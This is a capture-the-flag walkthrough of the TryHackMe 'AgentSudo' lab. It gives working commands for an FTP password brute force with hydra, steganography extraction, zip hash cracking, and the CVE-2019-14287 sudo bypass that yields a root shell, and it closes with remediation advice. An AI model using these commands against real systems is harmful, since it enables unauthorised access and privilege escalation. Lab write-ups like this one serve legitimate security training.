---
title: "AgentSudo Write-Up: TryHackMe Machine Walk-through"
date: 2022-01-09
description: "A walkthrough of the AgentSudo machine on TryHackMe, a Linux box requiring exploitation of information disclosure vulnerabilities and a sudo authentication bypass (CVE-2019-14287) for privilege escalation."
tags: ["tryhackme", "hacking", "privilege-escalation"]
cover: "https://miro.medium.com/v2/resize:fit:828/1*ZwI1k9l-zpRWnvBoK4UIqA.png"
canonicalURL: "https://saurabh-jain.medium.com/agentsudo-write-up-tryhackme-machine-walk-through-b270937a817e"
---

AgentSudo is a Linux-based machine on TryHackMe that covers information disclosure, steganography, and a critical sudo vulnerability. Dynamic IP assignments mean your address will differ from this walkthrough.

## Overview

The machine has two main phases:
1. **User shell:** Exploit information disclosure to gain credentials
2. **Root:** Exploit CVE-2019-14287, a sudo authentication bypass

## Step 1: Initial Reconnaissance

```bash
nmap -sV -sC -oN agentsudo.txt <target-ip>
```

Common open ports on this machine:
- **21/tcp** — FTP
- **22/tcp** — SSH
- **80/tcp** — HTTP (Apache web server)

## Step 2: Web Enumeration

Visit the HTTP service. The page hints at using a "codename" as your user-agent to get a special response. Fuzzing the `User-Agent` header reveals a redirect that leaks information about the number of agents on the system.

```bash
curl -A "C" http://<target-ip>/ -L
```

This information disclosure reveals a username hint and points to the FTP service.

## Step 3: FTP Brute Force

Using the discovered username, brute force the FTP credentials:

```bash
hydra -l <username> -P /usr/share/wordlists/rockyou.txt ftp://<target-ip>
```

Once in, download all available files — look for images that may contain hidden data.

## Step 4: Steganography

Images on the FTP server contain hidden messages. Use steghide to extract them:

```bash
steghide extract -sf <image-file>
```

The passphrase can be found by cracking a zip file found alongside the images using John the Ripper:

```bash
zip2john <file>.zip > hash.txt
john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

The extracted data contains SSH credentials.

## Step 5: Initial Access

```bash
ssh <username>@<target-ip>
```

You now have user-level shell. Grab the user flag.

## Step 6: Privilege Escalation — CVE-2019-14287

Check sudo permissions:

```bash
sudo -l
```

The output shows something like:
```
(ALL, !root) /bin/bash
```

This means the user can run `/bin/bash` as any user **except root**. However, CVE-2019-14287 bypasses this restriction. When sudo is configured with `!root`, specifying user ID `-1` or `4294967295` is treated as root:

```bash
sudo -u#-1 /bin/bash
```

You now have a root shell.

**PoC on ExploitDB:** https://www.exploit-db.com/exploits/47502

## Remediation

**Upgrade sudo** — this affects versions prior to 1.8.28. Patch immediately:
```bash
apt-get upgrade sudo
```

**Avoid `!root` rules** — if you need to restrict root access, redesign the policy rather than using negation in sudoers.

```bash
# Vulnerable sudoers rule
james ALL=(ALL, !root) /bin/bash

# Safer approach: explicitly list allowed users
james ALL=(www-data) /bin/bash
```

## Key Takeaways

1. **Information disclosure is underrated** — a leaked username or file list is often the first domino
2. **Steganography is used in real attacks** — data exfiltration in images bypasses many DLP controls
3. **CVE-2019-14287 was critical** — negation rules in sudoers were widely trusted but broken
4. **Always patch sudo** — it runs as root; a vulnerability here is always severe

---

*TryHackMe room: [AgentSudo](https://tryhackme.com/room/agentsudoctf)*
